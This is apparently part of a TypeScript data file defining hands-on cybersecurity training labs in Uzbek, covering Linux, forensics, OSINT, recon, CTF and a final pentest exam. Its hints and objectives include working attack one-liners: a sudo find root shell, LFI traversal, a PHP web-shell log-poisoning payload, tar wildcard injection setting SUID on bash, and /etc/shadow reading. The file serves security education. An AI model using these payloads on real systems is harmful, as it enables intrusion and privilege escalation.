      { level: 3, title: "Find", penalty: 35, content: "`sudo find . -exec /bin/sh \\; -quit`" }
    ]
  },
  {
    id: 42,
    slug: 'linux-find-grep',
    title: 'Linux Find & Grep',
    targetApp: 'Linux Lab',
    entryPoint: 'Terminal',
    category: 'LINUX',
    difficulty: 'Easy',
    xp: 140,
    estimatedMinutes: 25,
    isPremium: false,
    description: "Katta fayl tizimi ichidan maxsus kengaytmali, oxirgi 24 soatda o'zgargan va ichida parol bo'lgan fayllarni toping.",
    briefing: "find va grep vositalarini quvur (pipe) orqali birlashtirib, tizim administratorining unutilgan parolini qidiring.",
    objectives: [
      { id: 1, title: "Konfiguratsiya fayllarini qidirish", description: "find /var/www -name '*.conf' buyrug'ini qo'llang", autoKey: "lnx_find_conf" },
      { id: 2, title: "Fayllar ichidan matn qidirish", description: "grep -rni 'DB_PASSWORD' orqali parollarni qidiring", autoKey: "lnx_grep_password" },
      { id: 3, title: "Maxfiy flagni topish", description: "Yashirin fayldagi FLAG{...} ni ajratib oling", autoKey: "lnx_flag_found" }
    ],
    hints: [
      { level: 1, title: "find", penalty: 10, content: "`find / -name '*flag*' 2>/dev/null`" },
      { level: 2, title: "grep", penalty: 20, content: "`grep -rnw '/var/www/' -e 'FLAG{' 2>/dev/null`" },
      { level: 3, title: "Size", penalty: 30, content: "`find / -size +10M -size -50M` orqali g'ayritabiiy katta fayllarni topish mumkin." }
    ]
  },
  {
    id: 43,
    slug: 'linux-bash-task',
    title: 'Linux Bash Task',
    targetApp: 'Linux Lab',
    entryPoint: 'Terminal',
    category: 'LINUX',
    difficulty: 'Medium',
    xp: 180,
    estimatedMinutes: 35,
    isPremium: true,
    description: "Avtomatlashtirilgan Bash skripti yozib, 100 ta serverning ochiq portlarini tekshiring va natijani saralang.",
    briefing: "Bash tsikllari va tarmoq buyruqlari yordamida berilgan IP lar ro'yxatidan 80-porti ochiq serverlarni ajratib oling.",
    objectives: [
      { id: 1, title: "Bash tsiklini tuzish", description: "for ip in $(cat targets.txt) mantiqini yozing", autoKey: "lnx_bash_loop" },
      { id: 2, title: "Port tekshiruvini amalga oshirish", description: "nc -zv yoki /dev/tcp orqali ulanishni tekshiring", autoKey: "lnx_bash_port_scan" },
      { id: 3, title: "Natijani hisobot fayliga saqlash", description: "Skriptni muvaffaqiyatli ishlatib yakuniy flagni oling", autoKey: "lnx_bash_script_done" }
    ],
    hints: [
      { level: 1, title: "Bash", penalty: 15, content: "`#!/bin/bash` bilan boshlanuvchi skript yozing." },
      { level: 2, title: "nc", penalty: 25, content: "`nc -z -w 1 $ip 80 && echo \"$ip OPEN\"`" },
      { level: 3, title: "chmod", penalty: 35, content: "Skriptga ijro ruxsatini berishni unutmang: `chmod +x scan.sh`" }
    ]
  },
  {
    id: 44,
    slug: 'linux-security-audit',
    title: 'Linux Security Audit',
    targetApp: 'Linux Lab',
    entryPoint: 'Terminal',
    category: 'LINUX',
    difficulty: 'Medium',
    xp: 220,
    estimatedMinutes: 40,
    isPremium: true,
    description: "Lynis yoki shaxsiy audit skriptlari yordamida Linux serverining xavfsizlik darajasini (Hardening Index) baholang.",
    briefing: "Serverning xavfsizlik kamchiliklarini (ochiq portlar, bo'sh parollar, eski paketlar) aniqlang va mustahkamlash rejasini tuzing.",
    objectives: [
      { id: 1, title: "Audit vositasini ishga tushirish", description: "lynis audit system yoki shunga o'xshash skriptni bajaring", autoKey: "lnx_audit_run" },
      { id: 2, title: "Xavfli sozlamalarni aniqlash", description: "PermitRootLogin yes va bo'sh parollarni toping", autoKey: "lnx_weak_config" },
      { id: 3, title: "Xavfsizlik hisobotini tasdiqlash", description: "Topilgan xatolarni tuzatib flagni oling", autoKey: "lnx_hardening_flag" }
    ],
    hints: [
      { level: 1, title: "SSH", penalty: 15, content: "/etc/ssh/sshd_config faylini ko'zdan kechiring." },
      { level: 2, title: "Parollar", penalty: 25, content: "awk -F: '($2 == \"\") {print $1}' /etc/shadow orqali bo'sh parollarni qidiring." },
      { level: 3, title: "Firewall", penalty: 35, content: "iptables -L yoki ufw status tekshiring." }
    ]
  },
  {
    id: 45,
    slug: 'linux-investigation',
    title: 'Linux Investigation',
    targetApp: 'Linux Lab',
    entryPoint: 'Terminal',
    category: 'LINUX',
    difficulty: 'Hard',
    xp: 300,
    estimatedMinutes: 50,
    isPremium: true,
    description: "Buzib kirilgan serverda hujumchi qoldirgan orqa eshikni (Backdoor, Reverse Shell) toping va zararsizlantiring.",
    briefing: "Serverdan begona serverga muntazam ma'lumot uzatilmoqda. Shubhali tarmoq ulanishlarini va yashirin binar fayllarni toping.",
    objectives: [
      { id: 1, title: "Faol tarmoq ulanishlarini tahlil qilish", description: "netstat -tulnp yoki ss -tulpn orqali tashqi ulanishni toping", autoKey: "lnx_ss_investigated" },
      { id: 2, title: "Zararli jarayon faylini aniqlash", description: "/proc/<PID>/exe orqali diskdagi fayl manzilini toping", autoKey: "lnx_malware_file" },
      { id: 3, title: "Persistency (o'rnatish) mexanizmini ochish", description: "Systemd servisi yoki .bashrc dagi yashirin yuklamani topib flagni oling", autoKey: "lnx_backdoor_cleaned" }
    ],
    hints: [
      { level: 1, title: "Tarmoq", penalty: 20, content: "`ss -antp` qaysi dastur begona IP ga ulanayotganini ko'rsatadi." },
      { level: 2, title: "/proc", penalty: 35, content: "Jarayon o'chirilsa ham, /proc/$PID/ ostida xotiradagi nusxasi saqlanadi." },
      { level: 3, title: "Systemd", penalty: 50, content: "/etc/systemd/system/ papkasidagi yangi shubhali .service fayllarini ko'ring." }
    ]
  },

  // 46-52: Digital Forensics & Investigation
  {
    id: 46,
    slug: 'pcap-investigation',
    title: 'PCAP Investigation',
    targetApp: 'CyberCase',
    entryPoint: 'PCAP Viewer',
    category: 'FORENSICS',
    difficulty: 'Easy',
    xp: 150,
    estimatedMinutes: 25,
    isPremium: false,
    description: "Wireshark / tshark yordamida .pcap tarmoq trafigini tahlil qiling va shifrlanmagan HTTP so'rovlaridagi parollarni toping.",
    briefing: "Kompaniya tarmog'ida tutilgan paketlar ichida foydalanuvchining login va maxfiy ma'lumotlari mavjud.",
    objectives: [
      { id: 1, title: "HTTP trafigini filtrlash", description: "http.request.method == 'POST' filtrini qo'llang", autoKey: "pcap_http_filter" },
      { id: 2, title: "Fayl yuklamalarini ajratib olish", description: "Traffik ichidagi uzatilgan rasmni eksport qiling", autoKey: "pcap_file_export" },
      { id: 3, title: "Maxfiy flagni topish", description: "Parol maydonidagi FLAG{...} qiymatini oling", autoKey: "pcap_flag_found" }
    ],
    hints: [
      { level: 1, title: "Filter", penalty: 10, content: "Wireshark qidiruvida `http contains flag` yoki `frame contains FLAG`" },
      { level: 2, title: "Follow Stream", penalty: 20, content: "TCP Stream ni ochib to'liq yozishmani o'qing." },
      { level: 3, title: "Export", penalty: 30, content: "File -> Export Objects -> HTTP" }
    ]
  },
  {
    id: 47,
    slug: 'suspicious-ip-analysis',
    title: 'Suspicious IP Analysis',
    targetApp: 'CyberCase',
    entryPoint: 'Network Evidence',
    category: 'FORENSICS',
    difficulty: 'Medium',
    xp: 180,
    estimatedMinutes: 35,
    isPremium: true,
    description: "Tarmoq oqimi (NetFlow) jurnallarini tahlil qilib, Command & Control (C2) serveriga qilingan shubhali signallarni (beaconing) aniqlang.",
    briefing: "Ichki kompyuter har 30 soniyada noma'lum tashqi IP ga 128 baytlik so'rov yubormoqda. C2 aloqa protokolini tahlil qiling.",
    objectives: [
      { id: 1, title: "Davriy ulanishlarni hisoblash", description: "Ulanishlar vaqt oralig'idagi doimiylikni aniqlang", autoKey: "flow_beacon_found" },
      { id: 2, title: "Shubhali IP ning ASN va geolokatsiyasini aniqlash", description: "Whois va VirusTotal ma'lumotlarini tekshiring", autoKey: "flow_ip_reputation" },
      { id: 3, title: "C2 buyruqlarini deshifrlash", description: "Yuborilayotgan ma'lumotlar ichidagi flagni oling", autoKey: "flow_c2_decoded" }
    ],
    hints: [
      { level: 1, title: "Interval", penalty: 15, content: "Jadvalda bir xil vaqt oralig'idagi so'rovlarni guruhlang." },
      { level: 2, title: "DNS", penalty: 25, content: "DNS tunneling mavjudligini tekshirish uchun subdomenlar uzunligiga qarang." },
      { level: 3, title: "Data", penalty: 35, content: "Ma'lumotlar Base64 yoki XOR bilan shifrlangan bo'lishi mumkin." }
    ]
  },
  {
    id: 48,
    slug: 'web-log-investigation',
    title: 'Web Log Investigation',
    targetApp: 'CyberCase',
    entryPoint: 'Log Analyzer',
    category: 'FORENSICS',
    difficulty: 'Easy',
    xp: 160,
    estimatedMinutes: 25,
    isPremium: false,
    description: "Nginx / Apache access.log fayllarini tahlil qilib, SQLi va Web Shell yuklangan vaqtni aniqlang.",
    briefing: "Serverga qilingan hujumni tekshiring: hujumchi qaysi sahifalarni skanerladi, qaysi parametr zaif edi va qaysi faylni yukladi?",
    objectives: [
      { id: 1, title: "Hujumchi IP sini aniqlash", description: "Eng ko'p 404 va 500 status kodi olgan IP ni toping", autoKey: "log_attacker_ip" },
      { id: 2, title: "Muvaffaqiyatli hujumni topish", description: "Status 200 olgan SQLi yoki yuklash so'rovini ajrating", autoKey: "log_exploit_line" },
      { id: 3, title: "Yuklangan zararli fayl nomini aniqlash", description: "Hujumchi joylagan fayl nomini va flagni ko'rsating", autoKey: "log_webshell_name" }
    ],
    hints: [
      { level: 1, title: "Status", penalty: 10, content: "`grep ' 200 ' access.log | grep -E '(union|select|\.php)'`" },
      { level: 2, title: "User Agent", penalty: 20, content: "Sqlmap yoki nikto User-Agent izlarini qidiring." },
      { level: 3, title: "Vaqt", penalty: 30, content: "Hujum sodir bo'lgan aniq vaqt oralig'idagi loglarni filtrlang." }
    ]
  },
  {
    id: 49,
    slug: 'incident-timeline',
    title: 'Incident Timeline',
    targetApp: 'CyberCase',
    entryPoint: 'Timeline',
    category: 'FORENSICS',
    difficulty: 'Medium',
    xp: 220,
    estimatedMinutes: 40,
    isPremium: true,
    description: "Bir nechta manbalardan (tarmoq, tizim jurnallari, fayl tizimi) olingan dalillarni birlashtirib, xronologik xaritani tuzing.",
    briefing: "Hodisani tergov qilish (Incident Response). Boshlang'ich kirishdan boshlab (Initial Access) ma'lumot o'g'irlashgacha (Exfiltration) bo'lgan bosqichlarni qayd qiling.",
    objectives: [
      { id: 1, title: "Boshlang'ich kirish vaqtini aniqlash", description: "Phishing yoki zaiflikdan foydalanish vaqtini belgilang", autoKey: "ir_initial_access" },
      { id: 2, title: "Imtiyozlarni oshirish qadamini topish", description: "Qaysi foydalanuvchidan rootga o'tilganini ko'rsating", autoKey: "ir_priv_esc" },
      { id: 3, title: "Zarar ko'rgan ma'lumotlar hajmini aniqlash", description: "Exfiltratsiya qilingan fayllar va hisobot flagini oling", autoKey: "ir_flag_timeline" }
    ],
    hints: [
      { level: 1, title: "MACB", penalty: 15, content: "Fayllarning o'zgartirilish (Modified), kirish (Accessed), yaratilish (Created) vaqtlarini tahlil qiling." },
      { level: 2, title: "Korrelyatsiya", penalty: 25, content: "Logdagi vaqt bilan tarmoqdagi trafik vaqtini birlashtiring." },
      { level: 3, title: "MITRE ATT&CK", penalty: 35, content: "Har bir harakatni ATT&CK taktikasi bo'yicha belgilang." }
    ]
  },
  {
    id: 50,
    slug: 'file-metadata-investigation',
    title: 'File Metadata Investigation',
    targetApp: 'CyberCase',
    entryPoint: 'Metadata Viewer',
    category: 'FORENSICS',
    difficulty: 'Easy',
    xp: 140,
    estimatedMinutes: 20,
    isPremium: false,
    description: "PDF, DOCX va JPEG fayllarining EXIF va metadata parametrlarini o'rganib, muallif va GPS koordinatalarini toping.",
    briefing: "Fayl ichidagi yashirin metadata orqali jinoyatchining qaysi dasturdan foydalangani va surat qayerda olinganini aniqlang.",
    objectives: [
      { id: 1, title: "EXIF ma'lumotlarini o'qish", description: "exiftool orqali rasm parametrlarini tahlil qiling", autoKey: "meta_exif_read" },
      { id: 2, title: "GPS koordinatalarini aniqlash", description: "Rasm olingan joyning aniq kenglik va uzunlik koordinatalarini toping", autoKey: "meta_gps_found" },
      { id: 3, title: "Muallif nomidan flagni olish", description: "Hujjat xususiyatlaridagi muallif va flagni oling", autoKey: "meta_author_flag" }
    ],
    hints: [
      { level: 1, title: "Exiftool", penalty: 10, content: "`exiftool image.jpg` barcha tegishli teglarni chiqaradi." },
      { level: 2, title: "GPS", penalty: 20, content: "GPS Position: XX deg YY' ZZ\" N ko'rinishida bo'ladi." },
      { level: 3, title: "Hujjatlar", penalty: 30, content: "DOCX fayllar aslida ZIP arxivdir. `unzip doc.docx` qilib `core.xml` ni ko'ring." }
    ]
  },
  {
    id: 51,
    slug: 'hash-investigation',
    title: 'Hash Investigation',
    targetApp: 'CyberCase',
    entryPoint: 'Hash Workspace',
    category: 'FORENSICS',
    difficulty: 'Medium',
    xp: 180,
    estimatedMinutes: 30,
    isPremium: true,
    description: "MD5, SHA256 va NTLM xeshlarini aniqlang, yaxlitlikni tekshiring va lug'at asosida parollarni tiklang.",
    briefing: "Shubhali fayllarning xeshlarini VirusTotal / MalwareBazaar bazasidan qidiring va o'g'irlangan parollar xeshini oching.",
    objectives: [
      { id: 1, title: "Xesh turini aniqlash", description: "hash-identifier orqali berilgan xesh formatini toping", autoKey: "hash_type_id" },
      { id: 2, title: "Zararli dastur xeshini tekshirish", description: "SHA256 xeshining ma'lum zararli dasturga tegishliligini tasdiqlang", autoKey: "hash_malware_match" },
      { id: 3, title: "NTLM xeshini ochish", description: "Jon the Ripper orqali admin parolini tiklang", autoKey: "hash_cracked_flag" }
    ],
    hints: [
      { level: 1, title: "Uzunlik", penalty: 15, content: "32 belgi = MD5, 40 belgi = SHA1, 64 belgi = SHA256." },
      { level: 2, title: "Online", penalty: 25, content: "CrackStation yoki hashkiller bazalaridan tekshirib ko'ring." },
      { level: 3, title: "John", penalty: 35, content: "`john --format=NT --wordlist=rockyou.txt hashes.txt`" }
    ]
  },
  {
    id: 52,
    slug: 'malware-triage-concepts',
    title: 'Malware Triage Concepts',
    targetApp: 'CyberCase',
    entryPoint: 'Analysis Workspace',
    category: 'FORENSICS',
    difficulty: 'Hard',
    xp: 300,
    estimatedMinutes: 50,
    isPremium: true,
    description: "Shubhali binar faylning statik tahlilini (strings, PE headers, imports) o'tkazib, uning qobiliyatlarini baholang.",
    briefing: "Binar faylni ishga tushirmasdan turib, qaysi DLL larni yuklashi, qaysi API larni chaqirishi va qaysi IP ga ulanishini aniqlang.",
    objectives: [
      { id: 1, title: "Satrlar (strings) tahlili", description: "Binar ichidagi URL lar va qiziqarli satrlarni ajrating", autoKey: "mal_strings_extracted" },
      { id: 2, title: "Import jadvallarini o'rganish", description: "VirtualAlloc, WriteProcessMemory kabi xavfli API larni toping", autoKey: "mal_imports_identified" },
      { id: 3, title: "Yashiringan konfiguratsiyani o'qish", description: "XOR bilan shifrlangan C2 manzilini ochib flagni oling", autoKey: "mal_config_flag" }
    ],
    hints: [
      { level: 1, title: "strings", penalty: 20, content: "`strings -n 8 sample.bin | grep -i http`" },
      { level: 2, title: "PE", penalty: 35, content: "PEview yoki pestudio orqali bo'limlar (sections) entropiyasini tekshiring." },
      { level: 3, title: "XOR", penalty: 50, content: "CyberChef da 'XOR Brute Force' amalini qo'llang." }
    ]
  },

  // 53-54: OSINT
  {
    id: 53,
    slug: 'osint-investigation',
    title: 'OSINT Investigation',
    targetApp: 'IntelDesk',
    entryPoint: 'Investigation Board',
    category: 'OSINT',
    difficulty: 'Easy',
    xp: 160,
    estimatedMinutes: 25,
    isPremium: false,
    description: "Ochiq manbalar orqali tashkilot xodimlari, elektron pochta formatlari va ijtimoiy tarmoq profillarini tahlil qiling.",
    briefing: "Maqsadli kompaniya haqida passiv razvedka o'tkazing: kompaniya domeniga bog'liq barcha xodimlar va ularning lavozimlarini toping.",
    objectives: [
      { id: 1, title: "Domen email formatini aniqlash", description: "first.last@company.uz yoki first@company.uz formatini tasdiqlang", autoKey: "osint_email_format" },
      { id: 2, title: "Xodimlar ro'yxatini shakllantirish", description: "LinkedIn / Google Dorking orqali 5 nafar asosiy mutaxassisni toping", autoKey: "osint_staff_found" },
      { id: 3, title: "Ochiq kod omboridan kalitni topish", description: "GitHub commitlarida unutilgan API kalitini oling", autoKey: "osint_github_leak" }
    ],
    hints: [
      { level: 1, title: "Google Dorks", penalty: 10, content: "`site:linkedin.com/in/ \"Kompaniya Nomi\"`" },
      { level: 2, title: "Hunter.io", penalty: 20, content: "Email formatlarini aniqlash uchun hunter yoki phonebook.cz" },
      { level: 3, title: "GitHub", penalty: 30, content: "`company.uz password` yoki `company.uz secret` deb qidiring." }
    ]
  },
  {
    id: 54,
    slug: 'metadata-osint',
    title: 'Metadata OSINT',
    targetApp: 'IntelDesk',
    entryPoint: 'Metadata',
    category: 'OSINT',
    difficulty: 'Easy',
    xp: 140,
    estimatedMinutes: 20,
    isPremium: false,
    description: "Kompaniya saytida e'lon qilingan ommaviy fayllardan (PDF/DOCX) ichki foydalanuvchilar, printerlar va dasturiy ta'minotni toping.",
    briefing: "Saytdagi ochiq hisobotlarni ko'chirib, ularning yaratuvchilari va ichki tarmoq yo'llarini (file paths) aniqlang.",
    objectives: [
      { id: 1, title: "Saytdagi barcha PDF larni topish", description: "site:target.uz filetype:pdf qidiruvini qo'llang", autoKey: "meta_pdf_dork" },
      { id: 2, title: "Ichki kompyuter nomlarini ajratish", description: "Metadata orqali Windows foydalanuvchi nomlarini toping", autoKey: "meta_usernames_extracted" },
      { id: 3, title: "Ichki server manzilini topish", description: "SharePoint yoki ichki fayl serveri nomini va flagni oling", autoKey: "meta_sharepoint_flag" }
    ],
    hints: [
      { level: 1, title: "FOCA", penalty: 10, content: "Hujjatlar metadatasida ko'pincha `C:\\Users\\admin\\Desktop\\` kabi yo'llar qoladi." },
      { level: 2, title: "Dastur", penalty: 20, content: "Fayl yaratilgan Word/Acrobat versiyasini aniqlang." },
      { level: 3, title: "Foydalanuvchilar", penalty: 30, content: "Topilgan foydalanuvchilar nomini keyingi hujumda (brute force) ishlatish mumkin." }
    ]
  },

  // 55-56: Recon
  {
    id: 55,
    slug: 'network-recon-simulation',
    title: 'Network Recon Simulation',
    targetApp: 'ReconLab',
    entryPoint: 'Recon Workspace',
    category: 'NETWORK',
    difficulty: 'Medium',
    xp: 220,
    estimatedMinutes: 35,
    isPremium: false,
    description: "Nmap, Masscan va RustScan orqali butun tarmoq blokini tezkor skanerlash va xizmatlar versiyasini aniqlashni o'rganing.",
    briefing: "Berilgan 10.10.0.0/24 subnetida faol serverlarni aniqlang, filtrlangan portlar sababini tahlil qiling va zaif xizmatni toping.",
    objectives: [
      { id: 1, title: "Subnetdagi faol xostlarni aniqlash", description: "nmap -sn 10.10.0.0/24 (ping sweep) ni bajaring", autoKey: "recon_live_hosts" },
      { id: 2, title: "Xizmatlar versiyalarini skanerlash", description: "nmap -sV -sC orqali skriptlarni ishga tushiring", autoKey: "recon_services_mapped" },
      { id: 3, title: "Nishon serverdagi flagni topish", description: "Ochiq qolgan servis banneridagi flagni oling", autoKey: "recon_banner_flag" }
    ],
    hints: [
      { level: 1, title: "Ping", penalty: 15, content: "`nmap -sn` ICMP echo, TCP SYN va ARP so'rovlari bilan xostlarni topadi." },
      { level: 2, title: "Flags", penalty: 25, content: "`-sV` banner grabbing orqali xizmat nomini aniqlaydi." },
      { level: 3, title: "Fast", penalty: 35, content: "Barcha 65535 ta portni skanerlash: `nmap -p- --min-rate 1000`" }
    ]
  },
  {
    id: 56,
    slug: 'web-attack-surface',
    title: 'Web Attack Surface',
    targetApp: 'ReconLab',
    entryPoint: 'Target Map',
    category: 'NETWORK',
    difficulty: 'Medium',
    xp: 240,
    estimatedMinutes: 40,
    isPremium: true,
    description: "Subdomain enumeration (amass, subfinder), vhost aniqlash va yashirin API endpointlarni xaritalashtiring.",
    briefing: "Maqsadli domenning barcha subdomenlarini va yashirin virtual xostlarini (Virtual Hosts) topib hujum yuzasini xaritalang.",
    objectives: [
      { id: 1, title: "Subdomenlarni ro'yxatlash", description: "Ochiq sertifikatlar (crt.sh) va DNS orqali 10 ta subdomenni toping", autoKey: "recon_subs_found" },
      { id: 2, title: "VHost fuzzing o'tkazish", description: "Host sarlavhasini ffuf orqali fuzzi qilib yashirin panelni toping", autoKey: "recon_vhost_found" },
      { id: 3, title: "Developer paneliga kirish", description: "Topilgan dev.target.uz orqali maxfiy flagni oling", autoKey: "recon_dev_flag" }
    ],
    hints: [
      { level: 1, title: "ffuf", penalty: 15, content: "`ffuf -w words.txt -u http://target.uz -H 'Host: FUZZ.target.uz' -fs <size>`" },
      { level: 2, title: "Size filtri", penalty: 25, content: "Barcha soxta so'rovlar bir xil hajm qaytarsa, uni `-fs` orqali filtrlang." },
      { level: 3, title: "Dev", penalty: 40, content: "`dev.target.uz`, `staging.target.uz`, `vpn.target.uz` ko'p uchraydi." }
    ]
  },

  // 57-59: CTF Challenges
  {
    id: 57,
    slug: 'ctf-web-challenge',
    title: 'CTF Web Challenge',
    targetApp: 'CTF Arena',
    entryPoint: 'Challenge UI',
    category: 'CTF',
    difficulty: 'Medium',
    xp: 250,
    estimatedMinutes: 45,
    isPremium: false,
    description: "Bir nechta zaifliklar (LFI + Log Poisoning) zanjiridan iborat klassik CTF veb topshirig'ini yeching.",
    briefing: "Klassik CTF stsenariysi: til parametrida LFI zaifligini toping, Apache access log fayliga PHP kodini kiritib RCE oling va flagni o'qing.",
    objectives: [
      { id: 1, title: "LFI zaifligini aniqlash", description: "?page=../../../../etc/passwd orqali fayl o'qing", autoKey: "ctf_lfi_confirmed" },
      { id: 2, title: "User-Agent orqali log zaxarlash", description: "User-Agent ga <?php system($_GET['c']); ?> yozib so'rov jo'nating", autoKey: "ctf_log_poisoned" },
      { id: 3, title: "RCE orqali CTF flagini qo'lga kiritish", description: "Log faylni LFI orqali ochib buyruq bajaring va flagni oling", autoKey: "ctf_web_flag" }
    ],
    hints: [
      { level: 1, title: "LFI", penalty: 20, content: "URL dagi parametr fayl yo'lini qabul qilmoqda." },
      { level: 2, title: "Log yo'li", penalty: 35, content: "/var/log/apache2/access.log yoki /var/log/nginx/access.log" },
      { level: 3, title: "Zaxarlash", penalty: 50, content: "User-Agent maydoniga PHP kodi yozsangiz, u log faylida saqlanadi." }
    ]
  },
  {
    id: 58,
    slug: 'ctf-linux-challenge',
    title: 'CTF Linux Challenge',
    targetApp: 'CTF Arena',
    entryPoint: 'Terminal',
    category: 'CTF',
    difficulty: 'Medium',
    xp: 250,
    estimatedMinutes: 45,
    isPremium: false,
    description: "Linux qutisida (box) past vakolatli foydalanuvchidan root darajasiga ko'tarilish (Privilege Escalation) mashqi.",
    briefing: "Wildcard injection (* bilan tar) yoki noto'g'ri sozlangan ruxsatlar orqali root imtiyozlarini oling.",
    objectives: [
      { id: 1, title: "Tizim konfiguratsiyasini yig'ish", description: "LinPEAS yoki shaxsiy buyruqlar orqali vektorlarni tekshiring", autoKey: "ctf_pe_scan" },
      { id: 2, title: "Wildcard zaifligini ekspluatatsiya qilish", description: "tar * buyrug'i uchun --checkpoint argumentli fayllar yarating", autoKey: "ctf_tar_wildcard" },
      { id: 3, title: "Root flagini o'qish", description: "/root/flag.txt tarkibini oling", autoKey: "ctf_root_flag" }
    ],
    hints: [
      { level: 1, title: "Wildcard", penalty: 20, content: "Agar cron skripti `tar -czf backup.tar.gz *` qilsa, fayl nomlari parametr sifatida o'qiladi." },
      { level: 2, title: "Checkpoint", penalty: 35, content: "`touch '--checkpoint=1'` va `touch '--checkpoint-action=exec=sh run.sh'`" },
      { level: 3, title: "Shell", penalty: 50, content: "run.sh fayliga `chmod +s /bin/bash` deb yozing." }
    ]
  },
  {
    id: 59,
    slug: 'ctf-forensics-challenge',
    title: 'CTF Forensics Challenge',
    targetApp: 'CTF Arena',
    entryPoint: 'Evidence',
    category: 'CTF',
    difficulty: 'Medium',
    xp: 250,
    estimatedMinutes: 45,
    isPremium: true,
    description: "Zararlangan xotira tasvirini (Memory Dump) Volatility vositasi yordamida tahlil qiling va parolni tiklang.",
    briefing: "Kompaniya xodimi kompyuteridan olingan RAM xotira nusxasida ishlatilgan jarayonlar, klaviatura kiritmalari va parollarni toping.",
    objectives: [
      { id: 1, title: "Profil va OS versiyasini aniqlash", description: "volatility -f mem.raw imageinfo ni ishlatib profilni toping", autoKey: "ctf_vol_profile" },
      { id: 2, title: "Jarayonlar ro'yxatini chiqarish", description: "pslist va pstree orqali notepad yoki cmd ni ko'ring", autoKey: "ctf_vol_pslist" },
      { id: 3, title: "Xotiradan flagni ajratib olish", description: "Notepad jarayoni xotirasini dump qilib flagni oling", autoKey: "ctf_forensics_flag" }
    ],
    hints: [
      { level: 1, title: "Volatility", penalty: 20, content: "`python vol.py -f dump.raw --profile=Win7SP1x64 pslist`" },
      { level: 2, title: "Memdump", penalty: 35, content: "`memdump -p <PID> -D ./` orqali jarayon xotirasini ajrating." },
      { level: 3, title: "Strings", penalty: 50, content: "`strings -e l <pid>.dmp | grep -i FLAG`" }
    ]
  },

  // 60: Final Assessment
  {
    id: 60,
    slug: 'final-web-pentest-assessment',
    title: 'Final Web Pentest Assessment',
    targetApp: 'CyberRange',
    entryPoint: 'Full Environment',
    category: 'ASSESSMENT',
    difficulty: 'Expert',
    xp: 500,
    estimatedMinutes: 120,
    isPremium: true,
    description: "CyberTrip professional sertifikati uchun yakuniy amaliy imtihon: to'liq tarmoq va veb ilovalar ekotizimini pentest qiling.",
    briefing: "Bir nechta serverlardan iborat korporativ infratuzilma. Tashqi veb sayt zaifligidan kirib, ichki tarmoqqa o'tish (Pivoting), Active Directory domenni tahlil qilish va boshqaruvni to'liq qo'lga kiritish.",
    objectives: [
      { id: 1, title: "Perimetrni yorib o'tish (External Pentest)", description: "Veb ilovadagi zaiflik orqali dastlabki kirishga (Initial Foothold) erishing", autoKey: "assess_foothold" },
      { id: 2, title: "Ichki tarmoqqa pivoting qilish", description: "Chisel yoki SSH tunnel orqali ichki servisga ulaning", autoKey: "assess_pivot" },
      { id: 3, title: "Ichki ma'lumotlar bazasini komprometatsiya qilish", description: "Moliyaviy baza parolini qo'lga kiriting", autoKey: "assess_db_compromised" },
      { id: 4, title: "Root / Domain Admin huquqini olish", description: "Boshqaruvchi serverda to'liq imtiyozga chiqing va audit bayonotini yozing", autoKey: "assess_root_flag" }
    ],
    hints: [
      { level: 1, title: "Metodologiya", penalty: 30, content: "Recon -> Scanning -> Exploitation -> Post-Exploitation -> Lateral Movement tartibida harakat qiling." },
      { level: 2, title: "Pivoting", penalty: 60, content: "Serverda ikkita tarmoq kartasi bor: 192.168.1.X va 10.0.5.X." },
      { level: 3, title: "Hisobot", penalty: 100, content: "Har bir topilgan zaiflik uchun CVSS balli va tuzatish bo'yicha tavsiya yozish kerak bo'ladi." }
    ]
  }
];

export function getLabBySlug(slug: string): LabDefinition | undefined {
  return LABS_DATA.find(lab => lab.slug === slug);
}

export function getLabsByCategory(category: string): LabDefinition[] {
  if (category === 'ALL' || category === 'Barchasi') return LABS_DATA;
  return LABS_DATA.filter(lab => lab.category.toLowerCase() === category.toLowerCase() || lab.category.includes(category.toUpperCase()));
}
